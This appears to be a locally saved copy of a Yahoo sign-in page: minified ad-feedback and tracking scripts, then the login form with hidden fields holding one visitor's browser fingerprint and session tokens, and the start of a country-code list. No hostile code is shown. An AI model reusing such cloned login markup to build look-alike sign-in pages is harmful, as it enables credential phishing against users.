style=\"fill:#b9bdc5;stroke:#b9bdc5;stroke-width:0;vertical-align:bottom\" height=\"22\" viewBox=\"0 0 24 24\" data-icon=\"thumbsdown-outline\"><path d=\"M21.6 2.3v10.1h-2.1c-1.1 0-1.7.7-2.1 1.1-.7.7-1.5 1.4-2.2 2.1-.2.2-.4.4-.5.6-1.6 1.8-2.3 3.4-2.2 5.5 0 0-.1.1-.3 0-.5-.1-1-.6-1.1-1.6-.3-2.4.2-4.3.7-4.7.9-.7.4-2-.8-2H3.9c-.7 0-1.3-.4-1.3-.8-.2-.2.4-.6.5-.6 1.6 0 1.6-2.1.1-2.2 0-.1-.1-.2-.1-.4 0-.1 0-.2.3-.3s.5-.1.7-.1c1.3 0 1.7-1.7.5-2.2 0 0-.2-.1-.3-.2-.2-.2-.3-.3-.3-.6 0 0 .1-.1.3-.2.3-.1.6-.2.7-.2 1.3-.2 1.4-1.9.1-2.2L5 3.3s-.1-.2-.1-.5c0-.4.2-.6.6-.6l16.1.1zM0 12.7c0 1.8 1.8 3 3.7 3h5.1c-.4 1.3-.6 2.9-.3 4.7.3 1.9 1.5 3.3 3.1 3.5 1.7.3 3.2-.7 3.1-2.4-.1-1.5.4-2.6 1.7-4 .2-.2.3-.4.5-.5.7-.7 1.4-1.3 2.1-1.9.3-.2.5-.4.6-.5h3.2c.7 0 1.2-.5 1.2-1.1V1.2c0-.7-.6-1.2-1.2-1.2H5.5c-1.6 0-3 1-3 2.8 0 .5.1.9.3 1.2-.8.5-1.2 1.2-1.2 2 0 .5.1.9.3 1.3-.7.4-1.2 1.1-1.2 2 0 .4.1.9.3 1.3-.6.6-1 1.3-1 2.1\"><\/path><\/svg>',bullhorn:'<svg width=\"22\" style=\"fill:#b9bdc5;stroke:#b9bdc5;stroke-width:0;vertical-align:bottom\" height=\"22\" viewBox=\"0 0 24 24\" data-icon=\"announcement\"><path d=\"M6 5.735L17.06 2.05c.52-.174.94.13.94.678v16.014c0 .548-.427.85-.94.68l-4.225-1.41C12.27 20.156 10.32 21.736 8 21.736c-2.76 0-5-2.24-5-5v-1H.99c-.547 0-.99-.566-.99-1.246V6.98c0-.687.45-1.245.99-1.245H6zm10 11.33V4.405l-9 3v6.66l9 3zm-11-.33c0 1.5 1.25 3 3 3 1.5 0 2.63-1.1 2.925-2.358L6 15.735H5v1zM2 13.7h3v-6H2v6zm21.348-7.234l-1.732 1c-.48.276-1.09.112-1.366-.366-.277-.478-.113-1.09.366-1.366l1.732-1c.478-.276 1.09-.112 1.366.366s.112 1.09-.366 1.366zm-1.732 7.538l1.732 1c.478.276.642.888.366 1.366-.276.478-.888.642-1.366.366l-1.732-1c-.478-.276-.643-.888-.366-1.366.276-.478.888-.642 1.366-.366zM23 11.734h-2c-.552 0-1-.448-1-1s.448-1 1-1h2c.552 0 1 .448 1 1s-.448 1-1 1z\"><\/path><\/svg>'},i=new s(\"act-ad-feedback\");for(e in h(i,{x:563,y:379,width:230,height:176,backgroundColor:\"white\"}),i.style={zIndex:121},i.style={borderRadius:\"4px\",filter:\"drop-shadow(1px 1px 4px #000)\"},t){var n=new p(\"100%\",\"100%\",\"\",!1),a=new c(e,t[e]),o=new s(\"act-feedback-\"+e),r=new s(\"act-roll-\"+e),d=document.createElement(\"span\"),l=document.createElement(\"p\");switch(h(o,{width:190,height:22}),h(a,{width:22,height:22}),h(r,{x:-10,y:-10,width:230,height:42}),o.style={overflow:\"visible\"},o.addChild(r),o.div.appendChild(d),o.div.appendChild(a.div),d.appendChild(l),o.addChild(n),this.setStyle(l,{margin:\"0px\",display:\"absolute\",fontSize:\"15px\",color:\"#000\",verticalAlign:\"top\",textAlign:\"left\",width:\"190px\",fontFamily:'\"Helvetica Neue\", Helvetica, Arial, sans-serif'}),this.setStyle(d,{left:\"32px\",position:\"absolute\",top:\"3px\"}),e){case\"money\":l.innerHTML=\"Why this Ad?\",h(o,{x:10,y:8});break;case\"thumbsup\":l.innerHTML=\"I like this ad\",h(o,{x:10,y:52});break;case\"thumbsdown\":l.innerHTML=\"I don't like this ad\",h(o,{x:10,y:100});break;case\"bullhorn\":l.innerHTML=\"Advertise with us\",o.style={top:\"\",left:\"10px\",bottom:\"8px\"}}i.addChild(o),o.addEventListener(\"click\",this.adFeedbackClick),o.addEventListener(\"mouseover\",b.feedbackRoll),o.addEventListener(\"mouseout\",b.feedbackRoll),y[e]=r}return i},feedbackRoll:function(e){\"mouseover\"===e.type?y[e.currentTarget.id.split(\"-\")[e.currentTarget.id.split(\"-\").length-1]].backgroundColor=\"#eff6ff\":y[e.currentTarget.id.split(\"-\")[e.currentTarget.id.split(\"-\").length-1]].backgroundColor=\"#fff\"},adFeedbackClick:function(e){var t,i,n=e.currentTarget.id,a=x.byId(\"act-adContainer\"),o=(x.byId(\"act-adContent\"),x.byId(\"act-format-show\"),x.byId(\"inv\"),d.ads[0].tag.ad_feedback_beacon);switch(n){case\"act-feedback-money\":b.dotsClick(),window.open(\"https:\/\/www.verizonmedia.com\/policies\/us\/en\/verizonmedia\/privacy\/adinfo\/index.html\",\"_blank\");break;case\"act-feedback-thumbsup\":b.dotsClick(),(new Image).src=o.replace(\/\\$\\(AD_FEEDBACK\\)\/,\"(type$fdb_submit,subo$100,afv$2.0)\"),a.appendChild(b.getFeedbackThanks().div),setTimeout(function(){var e=x.byId(\"act-feedback-thanks\");e&&r.child(e)},2e3);break;case\"act-feedback-thumbsdown\":for(b.dotsClick(),(new Image).src=o.replace(\/\\$\\(AD_FEEDBACK\\)\/,\"(type$fdb_submit,subo$10,afv$2.0)\"),g.x=160,a.appendChild(g.div),i=[b.byClass(\"title\"),b.byClass(\"summary\"),x.byId(\"cta\")],t=0;t<i.length;t++)i[t].style.display=\"none\";break;case\"act-feedback-bullhorn\":b.dotsClick(),window.open(\"https:\/\/www.ad.com\/?utm_source=yahoo-home&utm_medium=referral&utm_campaign=ad-feedback\",\"_blank\");break;case\"act-give-feedback\":r.child(g),a.appendChild(f.div),(new Image).src=o.replace(\/\\$\\(AD_FEEDBACK\\)\/,\"(type$fdb_cta,afv$2.0)\");break;case\"Misleading-or-a-scam\":case\"Low-quality\":case\"Disrupts-content\":case\"Offensive\":case\"Irrelevant\":a.appendChild(m.div),r.child(f),(new Image).src=o.replace(\/\\$\\(AD_FEEDBACK\\)\/,\"(type$fdb_submit,subo$\"+{Misleading:11,Low:13,Disrupts:15,Offensive:12,Irrelevant:14}[n.split(\"-\")[0]]+\",afv$2.0)\");break;case\"Something-else\":a.appendChild(v.div),r.child(f);break;case\"act-something-submit\":(new Image).src=o.replace(\/\\$\\(AD_FEEDBACK\\)\/,\"(type$fdb_submit,subo$16,afv$2.0,cmnt$\"+escape(x.byId(\"act-ad-feedback-input\").value)+\")\"),r.child(v),a.appendChild(m.div);break;case\"act-something-cancel\":r.child(v),a.appendChild(m.div),(new Image).src=o.replace(\/\\$\\(AD_FEEDBACK\\)\/,\"(type$fdb_submit,subo$16,afv$2.0)\");break;default:w(\"adFeedbackClick:\",n)}},getDots:function(){var e,t=new s(\"act-dots\"),i=new p(\"150%\",\"100%\",\"act-dots-inv\",!1);for(i.x=-10,t.style={overflow:\"visible\"},e=0;e<3;e++){var n=new s(\"act-dot-\"+e);h(n,{y:5*e+10,x:0,width:3,height:3,backgroundColor:\"#768187\"}),n.style={borderRadius:\"5px\"},t.addChild(n)}return t.addChild(i),h(t,{height:36,width:13,visible:!0}),t.style={left:\"\",top:\"\",bottom:\"8px\",right:\"12px\",zIndex:120},t.addEventListener(\"mouseover\",function(e){for(var t=0;t<3;t++)x.byId(\"act-dot-\"+t).style.backgroundColor=\"#4290f8\"}),t.addEventListener(\"mouseout\",function(e){for(var t=0;t<3;t++)x.byId(\"act-dot-\"+t).style.backgroundColor=\"#626d75\"}),t.addEventListener(\"click\",b.dotsClick),t.style={zIndex:1001},t},getFeedbackThanks:function(){var e=new s(\"act-feedback-thanks\");return h(e,{x:545,y:510,width:250,height:50,backgroundColor:\"white\"}),e.style={textAlign:\"center\",mozBoxShadow:\"0 0 4px #000000\",webkitBoxShadow:\"0 0 4px #000000\",boxShadow:\"0 0 4px #000000\"},e.div.innerHTML='<p class=\"getFeedbackThanks\">Thanks for your feedback!<\/p>',e.style={zIndex:1001},e},getFeedbackPanel:function(){var e=new s(\"act-feedback-panel\"),t=new s,i=new s,n=new s(\"act-give-feedback\"),a={left:\"17px\",position:\"relative\",width:\"calc(100% - 17px)\",height:\"\",margin:\"0px 0px 0px 0px\",backgroundColor:\"rgba(255,0,0,0)\"};return t.style=a,i.style=a,n.style=a,n.style={width:\"\"},t.div.innerHTML='<p style=\"margin:20px 0px 0px 0px;font-size:16px;\">This ad has been hidden<\/p>',i.div.innerHTML='<p style=\"margin:10px 0px 0px 0px;font-weight:normal;\">You can give additional feedback on this ad to improve your future experience.<\/p>',n.div.innerHTML='<p style=\"margin:32px 0px 0px 0px;color:#0b99fb;\">Give feedback<\/p>',h(e,{x:160,y:11,width:718,height:550,backgroundColor:\"#e8e9f0\"}),e.style={font:\"14px Helvetica Neue,Helvetica,Arial,sans-serif\",fontWeight:\"bold\",color:\"black\"},n.addEventListener(\"click\",b.adFeedbackClick),e.addChildren([t,i,n]),e.style={zIndex:1001},e},getChoicePanel:function(){for(var e=new s(\"act-choice-panel\"),t=new s,i={width:\"190px\",height:\"50px\",borderRadius:\"2px\",boxShadow:\"0 3px 8px 0 rgba(0, 0, 0, 0.08), 0 0 1px 0 rgba(0, 0, 0, 0.2)\",backgroundColor:\"#FFF\",font:\"15px Helvetica Neue,Helvetica,Arial,sans-serif\",textAlign:\"center\",color:\"#0b99fb\"},n=[{text:\"Misleading or a scam\",props:{x:16,y:49},subo:\"11\"},{text:\"Low quality\",props:{x:16,y:115},subo:\"13\"},{text:\"Disrupts content\",props:{x:16,y:181},subo:\"15\"},{text:\"Offensive\",props:{x:238,y:49},subo:\"12\"},{text:\"Irrelevant\",props:{x:238,y:115},subo:\"14\"},{text:\"Something else\",props:{x:238,y:181},subo:\"16\"}],a=0;a<n.length;a++){var o=n[a].text.replace(\/\\s\/gi,\"-\"),o=new s(o);h(o,n[a].props),o.style=i,o.div.setAttribute(\"class\",\"act-sans-select\"),o.div.innerHTML=\"<p>\"+n[a].text+\"<\/p>\",e.addChildren([o]),o.addEventListener(\"click\",b.adFeedbackClick)}return t.div.innerHTML='<p style=\"font:16px Helvetica Neue,Helvetica,Arial,sans-serif;color:black;font-weight:bold;\">Why don\\'t you like this ad?<\/p>',h(e,{x:160,y:11,width:718,height:550,backgroundColor:\"#e8e9f0\"}),t.style={left:\"16px\",width:\"calc(100% - 16px)\",height:\"\"},e.addChild(t),e.style={zIndex:1001},e},getSomethingElse:function(){var e=new s(\"act-something-else\"),t=new s(\"act-something-else-title\"),i=document.createElement(\"textarea\"),n=new s(\"act-something-submit\"),a=new s(\"act-something-cancel\");return i.setAttribute(\"id\",\"act-ad-feedback-input\"),i.setAttribute(\"type\",\"text\"),b.setStyle(i,{position:\"absolute\",top:\"52px\",left:\"16px\",width:\"505px\",height:\"129px\",resize:\"none\"}),h(e,{width:\"100%\",height:\"100%\",backgroundColor:\"#e8e9f0\"}),n.style={width:\"100px\",height:\"33px\",borderRadius:\"2px\",backgroundColor:\"#1b95ff\",left:\"16px\",top:\"200px\"},a.style={width:\"98px\",height:\"31px\",borderRadius:\"2px\",border:\"solid 1px #1b95ff\",left:\"128px\",top:\"200px\"},n.div.innerHTML='<p style=\"font-size:13px;color:#FFF;margin:9px 0px 0px 0px;\">Submit<\/p>',a.div.innerHTML='<p style=\"font-size:13px;color:#1b95ff;margin:9px 0px 0px 0px;\">Cancel<\/p>',e.style={font:\"16px Helvetica Neue,Helvetica,Arial,sans-serif\",color:\"black\",fontWeight:\"normal\",textAlign:\"center\"},t.style={left:\"16px\",width:\"calc(100% - 16px)\",height:\"\"},t.div.innerHTML='<p style=\"font-weight:bold;text-align:left;\">Give Feedback<\/p>',e.addChildren([t,n,a]),e.div.appendChild(i),n.addEventListener(\"click\",b.adFeedbackClick),a.addEventListener(\"click\",b.adFeedbackClick),h(e,{x:160,y:11,width:718,height:550,backgroundColor:\"#e8e9f0\"}),e.style={zIndex:1001},e},getFinalPanel:function(){var e=new s(\"act-final-panel\"),t=new s,i=new s,n={left:\"17px\",position:\"relative\",width:\"calc(100% - 17px)\",height:\"\",margin:\"0px 0px 0px 0px\",backgroundColor:\"rgba(255,0,0,0)\"};return t.style=n,i.style=n,t.div.innerHTML='<p style=\"margin:16px 0px 0px 0px;font-size:16px;\">Thanks for your feedback!<\/p>',i.div.innerHTML='<p style=\"margin:16px 0px 0px 0px;font-weight:normal;font-size:14px;\">We\\'ll review and make changes needed.<\/p>',e.style={font:\"16px Helvetica Neue,Helvetica,Arial,sans-serif\",color:\"black\",fontWeight:\"bold\",textAlign:\"left\"},h(e,{x:160,y:11,width:718,height:550,backgroundColor:\"#e8e9f0\"}),e.addChildren([t,i]),e.style={zIndex:1001},e},getButton:function(){var e=document.createElement(\"div\"),t=document.createElement(\"button\");return t.setAttribute(\"type\",\"submit\"),this.setStyle(t,{borderRadius:\"2px\",whiteSpace:\"nowrap\",paddingLeft:\"17px\",paddingRight:\"17px\",paddingTop:\"6px\",paddingBottom:\"6px\",display:\"table-cell\",color:\"#0078ff\",backgroundColor:\"transparent\",borderColor:\"#0078ff\",boxSizing:\"border-box\",font:'16px \"Helvetica Neue\",Helvetica,Arial,sans-serif',lineHeight:\"normal\",margin:\"0\"}),this.setStyle(e,{bottom:\"20px\",right:\"20px\",position:\"absolute\"}),t.innerHTML=\"Done\",e.addEventListener(\"mouseover\",function(){b.setStyle(t,{color:\"white\",backgroundColor:\"#285ef6\"})}),e.addEventListener(\"mouseout\",function(){b.setStyle(t,{color:\"#0078ff\",backgroundColor:\"transparent\"})}),e.id=\"ad-feedback-done\",e.appendChild(t),e},dotsClick:function(){var e=x.byId(\"act-adContainer\");if(x.byId(u.div.id))e.removeChild(u.div);else{var t,i=[\"money\",\"thumbsup\",\"thumbsdown\",\"bullhorn\"],n=new Image,a=d.ads[0].tag.ad_feedback_beacon;for(n.src=a.replace(\/\\$\\(AD_FEEDBACK\\)\/,\"(type$fdb_submit,subo$200,afv$2.0)\"),e.appendChild(u.div),t=0;t<i.length;t++)document.getElementById(\"act-roll-\"+i[t]).style.backgroundColor=\"#fff\"}},setStyle:function(e,t){for(var i in t)e.style[i]=t[i]}},function e(){var t=!1;(d=i.response)&&d.ads&&d.ads[0]&&d.ads[0].tag&&(x.loadScript(\"https:\/\/cdn.cmp.advertising.com\/libraries\/Espresso-1.7.7.js\",n),t=!0),t||setTimeout(e,50)}()}();<\/script>","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<img width=1 height=1 alt=\"\" src=\"https:\/\/12.at.atwola.com\/adcount|2.0|5113.1|5043035|0|5112|AdId=-41;BnId=4;ct=613221496;st=9281;adcid=1;itime=484569331;reqtype=5;guid=2ls6blpg5j66o&b=3&s=73;;impref=16164845692298238020;imprefseq=182127577203221451;imprefts=1616484569;adclntid=1004;spaceid=794260018;adposition=RICH;lmsid=;revshare=;pvid=r50q_DEwLjIq8MuuYFmY2ABtMTgzLgAAAAAkjMAY;sectionid=;kvsecure%2Ddarla=4%2D7%2D1%7Cysd%7C2;kvmn=y963896117;kvssp=ssp;kvsecure=true;kvpgcolo=sg3;kvy%2Dbucket=content%3Dno%5Fexpandable:exp%5Fiframe%5Fexpandable;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=os%5Fx:os%5Fx%5F10%5F13;kvadtc%5Fdvbrand=google;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fos%5Fx;kvrepo%5Fdvosplt=os%5Fx;kvadtc%5Fdvosversion=10%2E13%2E6;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;\">","cscURI":"https:\/\/12.at.atwola.com\/adcount|2.0|5113.1|5043035|0|5112|AdId=-41;BnId=4;ct=613221496;st=9281;adcid=1;itime=484569331;reqtype=5;guid=2ls6blpg5j66o&b=3&s=73;;impref=16164845692298238020;imprefseq=182127577203221451;imprefts=1616484569;adclntid=1004;spaceid=794260018;adposition=RICH;lmsid=;revshare=;pvid=r50q_DEwLjIq8MuuYFmY2ABtMTgzLgAAAAAkjMAY;sectionid=;kvsecure%2Ddarla=4%2D7%2D1%7Cysd%7C2;kvmn=y963896117;kvssp=ssp;kvsecure=true;kvpgcolo=sg3;kvy%2Dbucket=content%3Dno%5Fexpandable:exp%5Fiframe%5Fexpandable;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=os%5Fx:os%5Fx%5F10%5F13;kvadtc%5Fdvbrand=google;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fos%5Fx;kvrepo%5Fdvosplt=os%5Fx;kvadtc%5Fdvosversion=10%2E13%2E6;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;","behavior":"non_exp","adID":"1234567","matchID":"999999.999999.999999.999999","bookID":"11062490","slotID":"0","serveType":"10","ttl":-1,"err":false,"hasExternal":false,"supp_ugc":"0","placementID":"11062490","fdb":null,"serveTime":-1,"impID":"-1","creativeID":26756256,"adc":"{\"label\":\"AdChoices\",\"url\":\"https:\\\/\\\/info.yahoo.com\\\/privacy\\\/us\\\/yahoo\\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}","is3rd":1,"facStatus":{"fedStatusCode":"5","fedStatusMessage":"replaced: 1AS cpm is lower than 1M\/Gemini"},"userProvidedData":{},"facRotation":{},"slotData":{}}}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/4-7-1\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/4-7-1\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/4-7-1\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/unsupported-1946.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/4-7-1\/html\/r-csc.html","root":"sdarla","edgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/4-7-1","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/4-7-1","version":"4-7-1","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/4-7-1\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now","positions":{"RICH":{"dest":"tgtRICH","asz":"flex","id":"RICH","w":"fle","h":""}},"property":"","events":[],"lang":"en-us","spaceID":"794260018","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-7-1\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-7-1\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-7-1\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/unsupported-1946.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-7-1\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-7-1\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-7-1\",\"version\":\"4-7-1\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-7-1\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now\",\"positions\":{\"RICH\":{\"dest\":\"tgtRICH\",\"asz\":\"flex\",\"id\":\"RICH\",\"w\":\"fle\",\"h\":\"\"}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"794260018\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<!-- Page End HTML -->","pos_list":["RICH"],"transID":"darla_prefetch_1616484569509_353457315_3","k2_uri":"","fac_rt":-1,"ttl":-1,"spaceID":"794260018","lookupTime":34,"procTime":34,"npv":0,"pvid":"r50q_DEwLjIq8MuuYFmY2ABtMTgzLgAAAAAkjMAY","serveTime":-1,"ep":{"site-attribute":"geminifed=1 y-bucket=","tgt":"_blank","secure":true,"ref":"https:\/\/login.yahoo.com\/","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1616484569509_50254606_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":""}}}</script><script type="text/javascript" src="./Yahoo_files/boot.js"></script><script id="sf_host_lib_sf_auto_2-23-2-2021" type="text/javascript" class="sf_lib" src="./Yahoo_files/g-r-min.js"></script></head>
    <body class="bucket-">
    <script nonce="">
        (function(root) {
            var doc = document;
            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
            }
        }(this));
    </script>
    <div id="login-body" class="loginish  puree-v2 grid ">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.yahoo.com/">
            <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
            <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale=en_IN&amp;page=product&amp;y=PROD_ACCT">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                    <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
            </div>
            <div class="challenge yid-challenge">
    <div class="challenge-header">
</div><div class="username-challenge" id="login-landing">
    <strong class="challenge-heading">Sign&nbsp;in</strong>
    <span class="challenge-desc signin-sub-title">using your Yahoo&nbsp;account</span>
    
    <form id="login-username-form" method="post" action='' class="pure-form">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:8,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:4,&quot;timezoneOffset&quot;:-330,&quot;timezone&quot;:&quot;Asia/Calcutta&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;openDatabase&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;MacIntel&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:3,&quot;hash&quot;:&quot;e43a8bc708fc490225cde0663b28278c&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc.~Google SwiftShader&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:27,&quot;hash&quot;:&quot;d52a1516cfb5f1c2d8a427c14bc3645f&quot;},&quot;audio&quot;:&quot;124.04348210548778&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1280&quot;,&quot;h&quot;:&quot;800&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;689&quot;,&quot;h&quot;:&quot;1280&quot;},&quot;ts&quot;:{&quot;serve&quot;:1616484568053,&quot;render&quot;:1616484569822}}">
        <input type="hidden" name="crumb" value="NS4Za8TxVdF">
        <input type="hidden" name="acrumb" value="8JMZJQox">
        <input type="hidden" name="sessionIndex" value="QQ--">
        <input type="hidden" name="displayName" value="">
        <input type="hidden" name="deviceCapability" value="{&quot;pa&quot;:{&quot;status&quot;:false}}" id="deviceCapability">
        <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2">
            <div id="selected-country-code-cont" class="puree-dropdown selected-country-code-cont ltr hide">
                <div id="selected-country-code" class="selected-country-code">+91</div>
                <span class="arrow"></span>
            </div>
            <div id="country-dropdown-container" class="country-code-dropdown country-dropdown-container hide">
                <div class="puree-dropdown">
    <label class="offscreen" id="country-code-lbl-aria">Enter Country Code</label>
    <select type="select" name="countryCodeIntl" aria-required="true" role="combobox" aria-multiline="false" aria-labelledby="country-code-lbl-aria" disabled="">
        <option role="option" data-code="+93" value="AF">Afghanistan ‪(+93)‬</option>
        <option role="option" data-code="+355" value="AL">Albania ‪(+355)‬</option>
        <option role="option" data-code="+213" value="DZ">Algeria ‪(+213)‬</option>
        <option role="option" data-code="+1" value="AS">American Samoa ‪(+1)‬</option>
        <option role="option" data-code="+376" value="AD">Andorra ‪(+376)‬</option>
        <option role="option" data-code="+244" value="AO">Angola ‪(+244)‬</option>
        <option role="option" data-code="+1" value="AI">Anguilla ‪(+1)‬</option>
        <option role="option" data-code="+1" value="AG">Antigua and Barbuda ‪(+1)‬</option>
        <option role="option" data-code="+54" value="AR">Argentina ‪(+54)‬</option>
        <option role="option" data-code="+374" value="AM">Armenia ‪(+374)‬</option>
        <option role="option" data-code="+297" value="AW">Aruba ‪(+297)‬</option>
        <option role="option" data-code="+247" value="AC">Ascension ‪(+247)‬</option>
        <option role="option" data-code="+61" value="AU">Australia ‪(+61)‬</option>
        <option role="option" data-code="+672" value="AX">Australian External Territories ‪(+672)‬</option>
        <option role="option" data-code="+43" value="AT">Austria ‪(+43)‬</option>
        <option role="option" data-code="+994" value="AZ">Azerbaijan ‪(+994)‬</option>
        <option role="option" data-code="+1" value="BS">Bahamas ‪(+1)‬</option>
        <option role="option" data-code="+973" value="BH">Bahrain ‪(+973)‬</option>
        <option role="option" data-code="+880" value="BD">Bangladesh ‪(+880)‬</option>
        <option role="option" data-code="+1" value="BB">Barbados ‪(+1)‬</option>
        <option role="option" data-code="+375" value="BY">Belarus ‪(+375)‬</option>
        <option role="option" data-code="+32" value="BE">Belgium ‪(+32)‬</option>
        <option role="option" data-code="+501" value="BZ">Belize ‪(+501)‬</option>
        <option role="option" data-code="+229" value="BJ">Benin ‪(+229)‬</option>
        <option role="option" data-code="+1" value="BM">Bermuda ‪(+1)‬</option>
        <option role="option" data-code="+975" value="BT">Bhutan ‪(+975)‬</option>
        <option role="option" data-code="+591" value="BO">Bolivia ‪(+591)‬</option>
        <option role="option" data-code="+387" value="BA">Bosnia and Herzegovina ‪(+387)‬</option>
        <option role="option" data-code="+267" value="BW">Botswana ‪(+267)‬</option>
        <option role="option" data-code="+55" value="BR">Brazil ‪(+55)‬</option>
        <option role="option" data-code="+1" value="VG">British Virgin Islands ‪(+1)‬</option>
        <option role="option" data-code="+673" value="BN">Brunei Darussalam ‪(+673)‬</option>
        <option role="option" data-code="+359" value="BG">Bulgaria ‪(+359)‬</option>
        <option role="option" data-code="+226" value="BF">Burkina Faso ‪(+226)‬</option>
        <option role="option" data-code="+257" value="BI">Burundi ‪(+257)‬</option>
        <option role="option" data-code="+855" value="KH">Cambodia ‪(+855)‬</option>
        <option role="option" data-code="+237" value="CM">Cameroon ‪(+237)‬</option>
        <option role="option" data-code="+1" value="CA">Canada ‪(+1)‬</option>
        <option role="option" data-code="+238" value="CV">Cape Verde ‪(+238)‬</option>
        <option role="option" data-code="+1" value="KY">Cayman Islands ‪(+1)‬</option>
        <option role="option" data-code="+236" value="CF">Central African Republic ‪(+236)‬</option>
        <option role="option" data-code="+235" value="TD">Chad ‪(+235)‬</option>
        <option role="option" data-code="+56" value="CL">Chile ‪(+56)‬</option>
        <option role="option" data-code="+86" value="CN">China ‪(+86)‬</option>
        <option role="option" data-code="+57" value="CO">Colombia ‪(+57)‬</option>
        <option role="option" data-code="+269" value="KM">Comoros ‪(+269)‬</option>
        <option role="option" data-code="+242" value="CG">Congo ‪(+242)‬</option>
        <option role="option" data-code="+682" value="CK">Cook Islands ‪(+682)‬</option>
        <option role="option" data-code="+506" value="CR">Costa Rica ‪(+506)‬</option>
        <option role="option" data-code="+225" value="CI">Cote dÕIvoire ‪(+225)‬</option>
        <option role="option" data-code="+385" value="HR">Croatia ‪(+385)‬</option>
        <option role="option" data-code="+53" value="CU">Cuba ‪(+53)‬</option>
        <option role="option" data-code="+357" value="CY">Cyprus ‪(+357)‬</option>
